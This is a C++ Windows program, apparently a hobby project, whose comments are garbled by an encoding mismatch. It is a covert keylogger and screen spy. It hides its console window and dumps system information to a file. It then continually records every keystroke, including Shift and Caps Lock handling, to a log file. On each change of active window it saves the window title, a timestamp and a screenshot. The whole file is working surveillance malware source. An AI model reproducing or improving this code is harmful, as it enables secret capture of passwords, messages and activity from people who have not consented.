// ConsoleApplication7.cpp : �������̨Ӧ�ó������ڵ㡣
//

#include "stdafx.h"


using namespace std;
string Filename = "D:\\program\\cdobe\\bin\\log.txt";//������¼�ı�����D��log.txtĿ¼��

void PrtScn(char   *file_string,HWND hwnd) {

	//��ȡ�ô��ڵĴ�С
	RECT rect;
	GetClientRect(hwnd, &rect);
	int width = rect.right;
	int heigth = rect.bottom;
	// ��ȡ���ڵ��豸�����ģ�Device Contexts��
	HDC hdcWindow = GetDC(hwnd); // Ҫ��ͼ�Ĵ��ھ����Ϊ����ȫ��
	

								 // ��ȡ�豸�����Ϣ�ĳߴ��С
	int nBitPerPixel = GetDeviceCaps(hdcWindow, BITSPIXEL);
	CImage image;
	// ����ͼ�����ÿ�ߣ�����
	image.Create(width, heigth, nBitPerPixel);
	// ��ָ����Դ�豸���������е����ؽ���λ�飨bit_block��ת��
	BitBlt(
		image.GetDC(),  // ���浽��Ŀ�� ͼƬ���� ������
		0, 0,     // ��ʼ x, y ����
		width, heigth,  // ��ͼ���
		hdcWindow,      // ��ȡ����� �����ľ��
		0, 0,           // ָ��Դ�����������Ͻǵ� X, y �߼�����
		SRCCOPY);


	image.Save(file_string);

	// �ͷ� DC���
	ReleaseDC(hwnd, hdcWindow);
	// �ͷ�ͼƬ������
	image.ReleaseDC();
	// ��ͼƬ���浽 file_string
	//image.ReleaseGDIPlus();
	image.Destroy();
}


void Write(string ch)
{
	ofstream f1;
	f1.open(Filename, ios::app);
	f1 << ch;
	f1.close();
}
void Hide()
{
	HWND stealth;
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(stealth, SW_HIDE);
}
void GiveChar(char a[256], char b[256])
{
	for (int i = 0; i <= 256; i++)
		a[i] = b[i];
}
bool CheckChar(char a[256], char b[256])
{
	for (int i = 0; i <= 256; i++)
	{
		if (a[i] != b[i])
		{
			return 0;
		}
	}
	return 1;
}
void GetSystemTime()
{
	SYSTEMTIME sys;
	GetLocalTime(&sys);
	cout << sys.wYear << "/" << sys.wMonth << "/" << sys.wDay << " " << sys.wHour << ":" << sys.wMinute << ": " << sys.wMinute << " ";
}
string GetKey(int Key) // �жϼ��̰���ʲô��
{
	string KeyString = "";
	//�жϷ�������
	const int KeyPressMask = 0x80000000; //�������볣��
	int iShift = GetKeyState(0x10); //�ж�Shift��״̬
	bool IS = (iShift & KeyPressMask) == KeyPressMask; //��ʾ����Shift��
	if (Key >= 186 && Key <= 222)
	{
		switch (Key)
		{
		case 186:
			if (IS)
				KeyString = ":";
			else
				KeyString = ";";
			break;
		case 187:
			if (IS)
				KeyString = "+";
			else
				KeyString = "=";
			break;
		case 188:
			if (IS)
				KeyString = "<";
			else
				KeyString = ",";
			break;
		case 189:
			if (IS)
				KeyString = "_";
			else
				KeyString = "-";
			break;
		case 190:
			if (IS)
				KeyString = ">";
			else
				KeyString = ".";
			break;
		case 191:
			if (IS)
				KeyString = "?";
			else
				KeyString = "/";
			break;
		case 192:
			if (IS)
				KeyString = "~";
			else
				KeyString = "`";
			break;
		case 219:
			if (IS)
				KeyString = "{";
			else
				KeyString = "[";
			break;
		case 220:
			if (IS)
				KeyString = "|";
			else
				KeyString = "\\";
			break;
		case 221:
			if (IS)
				KeyString = "}";
			else
				KeyString = "]";
			break;
		case 222:
			if (IS)
				KeyString = '"';
			else
				KeyString = "'";
			break;
		}
	}
	//�жϼ��̵ĵ�һ��
	if (Key == VK_ESCAPE) // �˳�
		KeyString = "[Esc]";
	else if (Key == VK_F1) // F1��F12
		KeyString = "[F1]";
	else if (Key == VK_F2)
		KeyString = "[F2]";
	else if (Key == VK_F3)
		KeyString = "[F3]";
	else if (Key == VK_F4)
		KeyString = "[F4]";
	else if (Key == VK_F5)
		KeyString = "[F5]";
	else if (Key == VK_F6)
		KeyString = "[F6]";
	else if (Key == VK_F7)
		KeyString = "[F7]";
	else if (Key == VK_F8)
		KeyString = "[F8]";
	else if (Key == VK_F9)
		KeyString = "[F9]";
	else if (Key == VK_F10)
		KeyString = "[F10]";
	else if (Key == VK_F11)
		KeyString = "[F11]";
	else if (Key == VK_F12)
		KeyString = "[F12]";
	else if (Key == VK_SNAPSHOT) // ��ӡ��Ļ
		KeyString = "[PrScrn]";
	else if (Key == VK_SCROLL) // ��������
		KeyString = "[Scroll Lock]";
	else if (Key == VK_PAUSE) // ��ͣ���ж�
		KeyString = "[Pause]";
	else if (Key == VK_CAPITAL) // ��д����
		KeyString = "[Caps Lock]";

	//-------------------------------------//
	//���Ƽ�
	else if (Key == 8) //<- �ظ��
		KeyString = "[Backspace]";
	else if (Key == VK_RETURN) // �س���������
		KeyString = "[Enter]\n";
	else if (Key == VK_SPACE) // �ո�
		KeyString = " ";
	//�ϵ���:���̼�¼��ʱ�򣬿��Բ���¼��������Shift�ǲ������κ��ַ���
	//�ϵ����ͱ�ļ���ϣ����ʱ���ַ����
	/*
	else if (Key == VK_LSHIFT) // ����ϵ���
	KeyString = "[Shift]";
	else if (Key == VK_LSHIFT) // �Ҳ��ϵ���
	KeyString = "[SHIFT]";
	*/
	/*���ֻ�ǶԼ����������ĸ���м�¼:���Բ������¼�������ļ�*/
	else if (Key == VK_TAB) // �Ʊ��
		KeyString = "[Tab]";
	else if (Key == VK_LCONTROL) // ����Ƽ�
		KeyString = "[Ctrl]";
	else if (Key == VK_RCONTROL) // �ҿ��Ƽ�
		KeyString = "[CTRL]";
	else if (Key == VK_LMENU) // �󻻵���
		KeyString = "[Alt]";
	else if (Key == VK_LMENU) // �һ�����
		KeyString = "[ALT]";
	else if (Key == VK_LWIN) // �� WINDOWS ��
		KeyString = "[Win]";
	else if (Key == VK_RWIN) // �� WINDOWS ��
		KeyString = "[WIN]";
	else if (Key == VK_APPS) // ������ �Ҽ�
		KeyString = "�Ҽ�";
	else if (Key == VK_INSERT) // ����
		KeyString = "[Insert]";
	else if (Key == VK_DELETE) // ɾ��
		KeyString = "[Delete]";
	else if (Key == VK_HOME) // ��ʼ
		KeyString = "[Home]";
	else if (Key == VK_END) // ����
		KeyString = "[End]";
	else if (Key == VK_PRIOR) // ��һҳ
		KeyString = "[PgUp]";
	else if (Key == VK_NEXT) // ��һҳ
		KeyString = "[PgDown]";
	// �����õļ�����:һ�����û��
	else if (Key == VK_CANCEL) // Cancel
		KeyString = "[Cancel]";
	else if (Key == VK_CLEAR) // Clear
		KeyString = "[Clear]";
	else if (Key == VK_SELECT) //Select
		KeyString = "[Select]";
	else if (Key == VK_PRINT) //Print
		KeyString = "[Print]";
	else if (Key == VK_EXECUTE) //Execute
		KeyString = "[Execute]";

	//----------------------------------------//
	else if (Key == VK_LEFT) //�ϡ��¡����Ҽ�
		KeyString = "[��]";
	else if (Key == VK_RIGHT)
		KeyString = "[��]";
	else if (Key == VK_UP)
		KeyString = "[��]";
	else if (Key == VK_DOWN)
		KeyString = "[��]";
	else if (Key == VK_NUMLOCK)//С������������
		KeyString = "[NumLock]";
	else if (Key == VK_ADD) // �ӡ������ˡ���
		KeyString = "+";
	else if (Key == VK_SUBTRACT)
		KeyString = "-";
	else if (Key == VK_MULTIPLY)
		KeyString = "*";
	else if (Key == VK_DIVIDE)
		KeyString = "/";
	else if (Key == 190 || Key == 110) // С���� . ������ .
		KeyString = ".";
	//С�������ּ�:0-9
	else if (Key == VK_NUMPAD0)
		KeyString = "0";
	else if (Key == VK_NUMPAD1)
		KeyString = "1";
	else if (Key == VK_NUMPAD2)
		KeyString = "2";
	else if (Key == VK_NUMPAD3)
		KeyString = "3";
	else if (Key == VK_NUMPAD4)
		KeyString = "4";
	else if (Key == VK_NUMPAD5)
		KeyString = "5";
	else if (Key == VK_NUMPAD6)
		KeyString = "6";
	else if (Key == VK_NUMPAD7)
		KeyString = "7";
	else if (Key == VK_NUMPAD8)
		KeyString = "8";
	else if (Key == VK_NUMPAD9)
		KeyString = "9";
	//-------------------------------------------//

	//-------------------------------------------//
	//*����ĸ�Ĵ�Сд�����ж�*//
	else if (Key >= 97 && Key <= 122) // ��ĸ:a-z
	{
		if (GetKeyState(VK_CAPITAL)) // ��д����
		{
			if (IS) //Shift����:ΪСд��ĸ
				KeyString = Key;
			else // ֻ�д�д����:�����д��ĸ
				KeyString = Key - 32;
		}
		else// ��дû������
		{
			if (IS) // ����Shift��: ��д��ĸ
				KeyString = Key - 32;
			else // û�а�Shift��: Сд��ĸ
				KeyString = Key;
		}
	}
	else if (Key >= 48 && Key <= 57) // ��������:0-9���Ϸ��ķ���
	{
		if (IS)
		{
			switch (Key)
			{
			case 48: //0
				KeyString = ")";
				break;
			case 49://1
				KeyString = "!";
				break;
			case 50://2
				KeyString = "@";
				break;
			case 51://3
				KeyString = "#";
				break;
			case 52://4
				KeyString = "$";
				break;
			case 53://5
				KeyString = "%";
				break;
			case 54://6
				KeyString = "^";
				break;
			case 55://7
				KeyString = "&";
				break;
			case 56://8
				KeyString = "*";
				break;
			case 57://9
				KeyString = "(";
				break;
			}
		}
		else
			KeyString = Key;
	}
	if (Key != VK_LBUTTON || Key != VK_RBUTTON)
	{
		if (Key >= 65 && Key <= 90) //ASCII 65-90 ΪA-Z
		{
			if (GetKeyState(VK_CAPITAL)) // ��д����:���A-Z
			{
				if (IS) // ��д���������Ұ����ϵ���:���ΪСд��ĸ
					KeyString = Key + 32;
				else //ֻ�д�д����:���Ϊ��д��ĸ
					KeyString = Key;
			}
			else // ��дû������:a-z
			{
				if (IS)
				{
					KeyString = Key;
				}
				else
				{
					Key = Key + 32;
					KeyString = Key;
				}
			}
		}
	}

	return KeyString;
}

//����ʱ���ַ���
CString getfilename(WORD year, WORD month, WORD day, WORD hour,WORD minute,WORD second) {
	CString year1, month1, day1, hour1, minute1, second1;
	year1.Format("%d",year);
	month1.Format("%d", month);
	day1.Format("%d", day);
	hour1.Format("%d", hour);
	minute1.Format("%d", minute);
	second1.Format("%d", second);
	CString path1 = year1 +"."+ month1 + "." + day1 + "_" + hour1 + "." + minute1 + "." + second1;
	return path1;
}

wchar_t* c2w(const char *str)
{
	int length = strlen(str) + 1;
	wchar_t *t = (wchar_t*)malloc(sizeof(wchar_t)*length);
	memset(t, 0, length*sizeof(wchar_t));
	MultiByteToWideChar(CP_ACP, 0, str, strlen(str), t, length);
	return t;
}

void main()
{
	Hide();// ���ش���
//	char pathname[50];
	WORD year,month,day,hour,minute,second;
	char wnd_title[256];
	HWND hwnd ;
	HWND hwnd_new = GetForegroundWindow();
	SYSTEMTIME sys;//ʱ�����

	CString PrtScnPath;
	CString PrtScnName;
	CString file_string;

	system("systeminfo  >> D:\\systeminfo.txt");

	while (1)
	{
		ofstream f1;
		f1.open(Filename, ios::app);
		hwnd = hwnd_new;
		hwnd_new = GetForegroundWindow(); // get handle of currently active window
		GetWindowText(hwnd_new, wnd_title, sizeof(wnd_title));//���´��ڸ� 0

		if (hwnd != hwnd_new&&hwnd_new!=NULL)
		{
			
			
			GetLocalTime(&sys);
			year = sys.wYear; month = sys.wMonth; day = sys.wDay; hour = sys.wHour; minute = sys.wMinute; second = sys.wSecond;
			//�������п���ע�͵�����Լ��Դ
			cout << endl;
			cout << year << "/" << month << "/" << day << " " << hour << ":" << minute << ":" << second << " ";
			cout << wnd_title << " ";

			f1 << "\n ";
			f1 << year << "/" << month << "/" << day << " " << hour << ":" << minute << ":" << second << " ";
			f1 << wnd_title << " ";

			PrtScnPath = "D:\\";
			PrtScnName = getfilename(year, month, day, hour, minute, second);
			file_string = PrtScnPath + PrtScnName + ".jpg";
			//char  *file_string = _T("D:\\");//����·��
			cout << file_string;
			PrtScn((LPSTR)(LPCTSTR)file_string,hwnd_new);

		}
		string TempString = "";
		fstream FStream;
		FStream.open(Filename.c_str(), std::fstream::out | std::fstream::app);



		Sleep(5);
		for (int i = 8; i <= 255; i++)
		{
			if (GetAsyncKeyState(i) & 1 == 1)
			{
				TempString = GetKey(i);
				FStream.write(TempString.c_str(), TempString.size());
				cout << TempString;
				FStream.close();
				FStream.open(Filename.c_str(), std::fstream::out | std::fstream::app);
			}
		}

	}
}